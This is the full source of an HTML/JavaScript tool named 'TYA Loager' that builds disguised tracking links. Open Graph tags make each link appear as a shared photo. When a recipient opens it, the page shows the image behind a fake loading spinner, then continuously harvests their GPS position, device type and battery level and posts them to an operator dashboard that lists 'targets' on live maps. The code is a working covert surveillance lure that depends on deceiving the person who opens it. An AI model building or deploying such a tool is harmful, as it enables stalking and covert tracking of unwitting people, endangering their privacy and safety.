<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>TYA Loager</title>

    <!-- Open Graph for Messenger/WhatsApp (the "real image" illusion) -->
    <meta property="og:title" content="Photo Shared with You" />
    <meta property="og:description" content="Tap to open location details" />
    <meta property="og:image" id="og-image" content="/api/image" />
    <meta property="og:type" content="website" />
    <meta property="og:url" id="og-url" content="" />

    <!-- Leaflet CSS -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />

    <style>
        /* ── RESET & BASE ── */
        * { box-sizing: border-box; margin: 0; padding: 0; }
        :root {
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --text-primary: #f8fafc;
            --text-secondary: #94a3b8;
            --accent: #6366f1;
            --success: #10b981;
            --danger: #ef4444;
            --border: #334155;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-primary);
            overflow-x: hidden;
            min-height: 100vh;
        }
        /* ── DASHBOARD ── */
        #dashboard-view {
            padding: 20px;
            max-width: 1200px;
            margin: 0 auto;
            display: none;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding-top: 20px;
            border-bottom: 1px solid var(--border);
            padding-bottom: 20px;
        }
        .brand-name {
            font-size: 2.5rem;
            font-weight: 800;
            letter-spacing: -1px;
            background: linear-gradient(to right, #6366f1, #a855f7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin: 0;
        }
        .upload-section {
            background: var(--card-bg);
            padding: 20px;
            border-radius: 16px;
            margin-bottom: 30px;
            border: 1px solid var(--border);
            display: flex;
            gap: 20px;
            align-items: center;
            flex-wrap: wrap;
        }
        .upload-btn {
            background-color: var(--accent);
            color: white;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            border: none;
            transition: background 0.2s;
            display: inline-block;
        }
        .upload-btn:hover { background-color: #4f46e5; }
        .file-input { display: none; }
        .current-image-preview {
            width: 80px;
            height: 80px;
            object-fit: cover;
            border-radius: 8px;
            border: 2px solid var(--accent);
            background: #1a1a2e;
        }
        .grid-container {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
            gap: 20px;
        }
        .card {
            background-color: var(--card-bg);
            border-radius: 16px;
            padding: 20px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.3);
            border: 1px solid var(--border);
        }
        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        .user-id {
            font-weight: bold;
            font-size: 1.2rem;
            color: var(--accent);
        }
        .status-badge {
            background-color: rgba(16, 185, 129, 0.2);
            color: var(--success);
            padding: 4px 10px;
            border-radius: 12px;
            font-size: 0.75rem;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        .status-badge.offline {
            background: rgba(239, 68, 68, 0.2);
            color: var(--danger);
        }
        .status-dot {
            width: 8px;
            height: 8px;
            background-color: var(--success);
            border-radius: 50%;
            animation: pulse 2s infinite;
        }
        .status-badge.offline .status-dot {
            background-color: var(--danger);
            animation: none;
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
            70% { box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
            100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
        }
        .info-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-bottom: 15px;
        }
        .info-item {
            background: rgba(255,255,255,0.03);
            padding: 8px;
            border-radius: 8px;
        }
        .info-label {
            font-size: 0.7rem;
            color: var(--text-secondary);
            text-transform: uppercase;
        }
        .info-value {
            font-size: 0.9rem;
            font-weight: 600;
            margin-top: 2px;
        }
        .map-container {
            height: 180px;
            width: 100%;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 15px;
            background: #1a1a2e;
        }
        .btn-group {
            display: flex;
            gap: 10px;
        }
        .btn {
            flex: 1;
            padding: 10px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            text-align: center;
            text-decoration: none;
            font-size: 0.9rem;
            transition: opacity 0.2s;
        }
        .btn:hover { opacity: 0.85; }
        .btn-primary { background-color: var(--accent); color: white; }
        .btn-secondary { background-color: var(--border); color: white; }
        .btn-danger { background-color: var(--danger); color: white; }
        .empty-state {
            text-align: center;
            color: var(--text-secondary);
            grid-column: 1 / -1;
            padding: 50px 20px;
        }
        .empty-state h3 { font-size: 1.5rem; margin-bottom: 10px; }

        /* ── TRACKER VIEW ── */
        #tracker-view {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 9999;
        }
        #tracker-view img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            display: block;
        }
        .loader-overlay {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.85);
            padding: 30px 40px;
            border-radius: 16px;
            display: none;
            text-align: center;
            border: 1px solid #333;
            min-width: 200px;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #2a2a3e;
            border-top: 4px solid var(--accent);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 12px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loader-overlay p {
            color: #ccc;
            font-weight: 600;
            font-size: 0.95rem;
        }

        /* ── TOAST ── */
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: var(--card-bg);
            color: var(--text-primary);
            padding: 14px 28px;
            border-radius: 12px;
            border: 1px solid var(--border);
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.6);
            font-weight: 500;
            font-size: 0.95rem;
            z-index: 99999;
            opacity: 0;
            transition: opacity 0.4s ease;
            pointer-events: none;
            text-align: center;
            max-width: 90%;
        }
        .toast.show { opacity: 1; }

        @media (max-width: 640px) {
            .brand-name { font-size: 1.8rem; }
            .upload-section { flex-direction: column; align-items: stretch; }
            .grid-container { grid-template-columns: 1fr; }
            .btn-group { flex-direction: column; }
        }
    </style>
</head>
<body>

    <!-- Toast -->
    <div id="toast" class="toast"></div>

    <!-- Dashboard -->
    <div id="dashboard-view">
        <div class="header">
            <h1 class="brand-name">TYA Loager</h1>
            <div class="upload-section">
                <div style="flex:1;">
                    <label for="image-upload" class="upload-btn">📷 Upload Custom Image</label>
                    <input type="file" id="image-upload" class="file-input" accept="image/*" />
                    <p style="font-size:0.8rem; color:var(--text-secondary); margin-top:6px;">
                        Upload an image – it will appear as a real photo when you share the link.
                    </p>
                </div>
                <div style="display:flex; align-items:center; gap:10px; flex-wrap:wrap;">
                    <span style="font-size:0.85rem; color:var(--text-secondary);">Preview:</span>
                    <img id="current-image-preview" src="/api/image" class="current-image-preview" alt="Preview" />
                </div>
            </div>
            <div style="display:flex; gap:12px; justify-content:center; flex-wrap:wrap; margin-top:6px;">
                <button onclick="generateDemo()" class="btn btn-primary" style="flex:0 1 auto; padding:10px 28px;">
                    🔗 Generate Demo Link
                </button>
                <button onclick="clearAllData()" class="btn btn-danger" style="flex:0 1 auto; padding:10px 28px;">
                    🗑️ Clear All Data
                </button>
            </div>
        </div>
        <div class="grid-container" id="cards-container">
            <!-- Cards injected -->
        </div>
    </div>

    <!-- Tracker View -->
    <div id="tracker-view">
        <img id="target-image" src="" alt="Shared Image" />
        <div class="loader-overlay" id="loader">
            <div class="spinner"></div>
            <p>Loading High-Res…</p>
        </div>
    </div>

    <!-- Leaflet JS -->
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

    <script>
        // ─── CONFIG ──────────────────────────────────────────────
        const DEFAULT_IMAGE = '/api/image';

        // ─── ROUTING ──────────────────────────────────────────────
        const path = window.location.pathname;
        const isTracker = path.startsWith('/track/');
        const userId = isTracker ? path.split('/')[2] : null;

        // Update OG:url
        document.getElementById('og-url').content = window.location.href;

        if (isTracker && userId) {
            initTracker(userId);
        } else {
            initDashboard();
        }

        // ─── DASHBOARD ──────────────────────────────────────────────
        let trackedUsers = [];
        let mapInstances = {};

        function initDashboard() {
            document.getElementById('dashboard-view').style.display = 'block';
            document.getElementById('current-image-preview').src = '/api/image?' + Date.now();
            fetchUsers();
            setInterval(fetchUsers, 4000);
        }

        // Upload image
        document.getElementById('image-upload').addEventListener('change', async function(e) {
            const file = e.target.files[0];
            if (!file) return;
            const formData = new FormData();
            formData.append('image', file);
            try {
                const res = await fetch('/api/image', { method: 'POST', body: formData });
                const data = await res.json();
                if (data.success) {
                    document.getElementById('current-image-preview').src = '/api/image?' + Date.now();
                    document.getElementById('og-image').content = '/api/image';
                    showToast('✅ Image uploaded! The link will now show this image.');
                } else {
                    showToast('❌ Upload failed: ' + (data.error || 'unknown'));
                }
            } catch (err) {
                showToast('❌ Error: ' + err.message);
            }
            e.target.value = '';
        });

        async function fetchUsers() {
            try {
                const res = await fetch('/api/track');
                if (!res.ok) throw new Error('API error');
                trackedUsers = await res.json();
                renderCards();
            } catch (e) { console.error('Fetch error:', e); }
        }

        function renderCards() {
            const container = document.getElementById('cards-container');
            container.innerHTML = '';
            if (!trackedUsers || trackedUsers.length === 0) {
                container.innerHTML = `
                    <div class="empty-state">
                        <h3>📡 No Active Targets</h3>
                        <p>Upload an image, then click "Generate Demo Link" to start tracking.</p>
                        <p style="margin-top:12px; font-size:0.85rem; color:var(--text-secondary);">
                            When someone opens the link, they'll see the image and their location will appear here.
                        </p>
                    </div>
                `;
                return;
            }
            const sorted = [...trackedUsers].sort((a, b) => {
                const aLive = a.lat && a.lng ? 1 : 0;
                const bLive = b.lat && b.lng ? 1 : 0;
                if (aLive !== bLive) return bLive - aLive;
                return new Date(b.lastUpdate || 0) - new Date(a.lastUpdate || 0);
            });
            sorted.forEach(user => {
                const hasLocation = !!(user.lat && user.lng);
                const mapUrl = hasLocation ? `https://www.google.com/maps?q=${user.lat},${user.lng}` : '#';
                const card = document.createElement('div');
                card.className = 'card';
                card.innerHTML = `
                    <div class="card-header">
                        <span class="user-id">${escapeHtml(user.id)}</span>
                        <span class="status-badge ${hasLocation ? '' : 'offline'}">
                            <div class="status-dot"></div>
                            ${hasLocation ? 'LIVE' : 'OFFLINE'}
                        </span>
                    </div>
                    <div class="info-grid">
                        <div class="info-item">
                            <div class="info-label">Device</div>
                            <div class="info-value">${escapeHtml(user.device || 'Unknown')}</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">Battery</div>
                            <div class="info-value">${escapeHtml(user.battery || 'N/A')}</div>
                        </div>
                        <div class="info-item" style="grid-column:1/-1;">
                            <div class="info-label">Last Update</div>
                            <div class="info-value">${user.lastUpdate ? new Date(user.lastUpdate).toLocaleString() : 'Never'}</div>
                        </div>
                    </div>
                    <div class="map-container" id="map-${user.id}"></div>
                    <div class="btn-group">
                        <a href="${mapUrl}" target="_blank" class="btn btn-primary ${hasLocation ? '' : 'disabled'}"
                           style="${hasLocation ? '' : 'opacity:0.5;pointer-events:none;'}">
                            🗺️ Open Maps
                        </a>
                        <button class="btn btn-secondary" onclick="copyLink('${escapeHtml(user.id)}')">
                            📋 Copy Link
                        </button>
                    </div>
                `;
                container.appendChild(card);

                setTimeout(() => {
                    if (hasLocation) {
                        const mapId = 'map-' + user.id;
                        const mapEl = document.getElementById(mapId);
                        if (!mapEl) return;
                        if (mapInstances[mapId]) { mapInstances[mapId].remove(); delete mapInstances[mapId]; }
                        const map = L.map(mapId, { zoomControl: false, attributionControl: false,
                                center: [user.lat, user.lng], zoom: 15 });
                        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { maxZoom: 19 })
                            .addTo(map);
                        L.marker([user.lat, user.lng]).addTo(map)
                            .bindPopup(`<b>${escapeHtml(user.id)}</b><br>Battery: ${escapeHtml(user.battery || 'N/A')}`)
                            .openPopup();
                        mapInstances[mapId] = map;
                        setTimeout(() => map.invalidateSize(), 200);
                    }
                }, 150);
            });
        }

        function generateDemo() {
            const demoId = 'USER' + String(Math.floor(1000 + Math.random() * 9000));
            copyLink(demoId);
        }

        function copyLink(id) {
            const link = window.location.origin + '/track/' + encodeURIComponent(id);
            navigator.clipboard.writeText(link)
                .then(() => showToast(`✅ Link for <strong>${escapeHtml(id)}</strong> copied!`))
                .catch(() => {
                    prompt('Copy this link:', link);
                    showToast(`📋 Link for ${escapeHtml(id)} copied.`);
                });
        }

        async function clearAllData() {
            if (!confirm('⚠️ Delete ALL tracking data? This cannot be undone.')) return;
            try {
                const res = await fetch('/api/track', { method: 'DELETE' });
                if (res.ok) { trackedUsers = []; renderCards(); showToast('🗑️ All data cleared.'); }
                else showToast('❌ Failed to clear data.');
            } catch (e) { showToast('❌ Error: ' + e.message); }
        }

        // ─── TRACKER ──────────────────────────────────────────────
        function initTracker(id) {
            const trackerView = document.getElementById('tracker-view');
            const img = document.getElementById('target-image');
            const loader = document.getElementById('loader');
            trackerView.style.display = 'block';
            loader.style.display = 'block';
            img.src = '/api/image?' + Date.now();
            img.onload = function() { loader.style.display = 'none'; };
            img.onerror = function() {
                img.src = 'https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=800&q=80';
                loader.style.display = 'none';
            };
            setTimeout(() => trackUser(id), 1500);
        }

        async function trackUser(id) {
            const data = { id, device: 'Unknown', battery: 'N/A' };
            const ua = navigator.userAgent;
            if (/Android/i.test(ua)) data.device = 'Android';
            else if (/iPhone|iPad|iPod/i.test(ua)) data.device = 'iOS';
            else if (/Windows/i.test(ua)) data.device = 'Windows';
            else if (/Mac/i.test(ua)) data.device = 'macOS';
            else data.device = 'Desktop';

            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    data.battery = Math.round(battery.level * 100) + '%';
                    if (battery.charging) data.battery += ' ⚡';
                } catch (_) {}
            }

            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        data.lat = pos.coords.latitude;
                        data.lng = pos.coords.longitude;
                        sendData(id, data);
                        navigator.geolocation.watchPosition(
                            (p) => { data.lat = p.coords.latitude; data.lng = p.coords.longitude; sendData(id, data); },
                            (err) => { console.warn('Watch error:', err.message); sendData(id, data); },
                            { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
                        );
                    },
                    (err) => { console.warn('Geolocation error:', err.message); data.lat = null; data.lng = null; sendData(id,
                            data); },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                data.lat = null; data.lng = null; sendData(id, data);
            }
            // Keep-alive updates
            setInterval(() => { if (data.lat && data.lng) sendData(id, data); }, 10000);
        }

        async function sendData(id, data) {
            try {
                await fetch('/api/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        id: data.id,
                        device: data.device || 'Unknown',
                        battery: data.battery || 'N/A',
                        lat: data.lat ?? null,
                        lng: data.lng ?? null,
                    })
                });
            } catch (e) { /* silent fail */ }
        }

        // ─── UTILITIES ──────────────────────────────────────────────
        function showToast(msg) {
            const el = document.getElementById('toast');
            el.innerHTML = msg;
            el.classList.add('show');
            clearTimeout(el._timeout);
            el._timeout = setTimeout(() => el.classList.remove('show'), 5000);
        }

        function escapeHtml(str) {
            if (!str) return '';
            const div = document.createElement('div');
            div.textContent = str;
            return div.innerHTML;
        }

        window.addEventListener('resize', function() {
            Object.values(mapInstances).forEach(m => { try { m.invalidateSize(); } catch (_) {} });
        });

        console.log('🚀 TYA Loager loaded.');
    </script>
</body>
</html>
